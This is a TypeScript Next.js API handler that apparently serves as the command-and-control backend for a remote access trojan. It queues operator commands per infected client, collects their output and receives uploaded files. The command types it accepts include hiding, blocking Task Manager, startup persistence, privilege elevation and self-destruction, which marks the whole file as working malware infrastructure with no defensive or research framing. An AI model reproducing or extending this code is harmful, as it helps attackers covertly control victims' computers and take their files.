import { NextApiRequest, NextApiResponse } from 'next'
import { IncomingForm } from 'formidable'

interface Command {
  id: string
  command: string
  type: string
  timestamp: number
}

interface CommandResult {
  commandId: string
  output: string
  timestamp: number
}

const commandQueue = new Map<string, Command[]>()
const commandResults = new Map<string, CommandResult[]>()

export const config = {
  api: {
    bodyParser: false,
  },
}

const parseBody = async (req: NextApiRequest): Promise<any> => {
  return new Promise((resolve) => {
    let data = ''
    req.on('data', (chunk) => { data += chunk })
    req.on('end', () => {
      try {
        resolve(JSON.parse(data))
      } catch {
        resolve({})
      }
    })
  })
}

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  const { action, clientId } = req.query
  const cId = clientId as string

  switch (action) {
    case 'getCommand': {
      if (!cId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      const queue = commandQueue.get(cId) || []
      if (queue.length > 0) {
        const cmd = queue.shift()
        commandQueue.set(cId, queue)
        res.status(200).json({ status: 'success', command: cmd })
      } else {
        res.status(200).json({ status: 'success', command: null })
      }
      break
    }

    case 'sendCommand': {
      if (!cId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      const body = await parseBody(req)
      const { command, type } = body
      
      if (!type) {
        res.status(400).json({ status: 'error', message: '缺少命令类型' })
        break
      }
      
      const noContentTypes = ['processes', 'drives', 'startup', 'hide', 'blocktaskmgr', 'selfdestruct', 'elevate']
      if (!command && !noContentTypes.includes(type)) {
        res.status(400).json({ status: 'error', message: '缺少命令内容' })
        break
      }
      
      if (!commandQueue.has(cId)) {
        commandQueue.set(cId, [])
      }
      
      const cmd: Command = {
        id: `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        command,
        type: type || 'cmd',
        timestamp: Date.now()
      }
      
      commandQueue.get(cId)?.push(cmd)
      res.status(200).json({ status: 'success', commandId: cmd.id })
      break
    }

    case 'reportResult': {
      if (!cId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      const body = await parseBody(req)
      const { commandId, output } = body
      
      if (!commandId) {
        res.status(400).json({ status: 'error', message: '缺少命令ID' })
        break
      }
      
      if (!commandResults.has(cId)) {
        commandResults.set(cId, [])
      }
      
      const result: CommandResult = {
        commandId,
        output: output || '',
        timestamp: Date.now()
      }
      
      commandResults.get(cId)?.push(result)
      res.status(200).json({ status: 'success', message: '结果已报告' })
      break
    }

    case 'getResult': {
      if (!cId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      const results = commandResults.get(cId) || []
      if (results.length > 0) {
        const result = results.shift()
        commandResults.set(cId, results)
        res.status(200).json({ status: 'success', result: result?.output || '' })
      } else {
        res.status(200).json({ status: 'success', result: '' })
      }
      break
    }

    case 'uploadFile': {
      if (!cId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      const form = new IncomingForm({
        maxFileSize: 50 * 1024 * 1024,
      })
      
      form.parse(req, (err, fields, files) => {
        if (err) {
          res.status(500).json({ status: 'error', message: '文件解析失败' })
          return
        }
        
        const file = files?.file as any
        if (!file) {
          res.status(400).json({ status: 'error', message: '缺少文件' })
          return
        }
        
        const filename = Array.isArray(file) ? file[0]?.originalFilename : file?.originalFilename
        
        res.status(200).json({ 
          status: 'success', 
          message: '文件上传成功',
          filename
        })
      })
      break
    }

    default: {
      res.status(400).json({ status: 'error', message: '未知操作' })
    }
  }
}
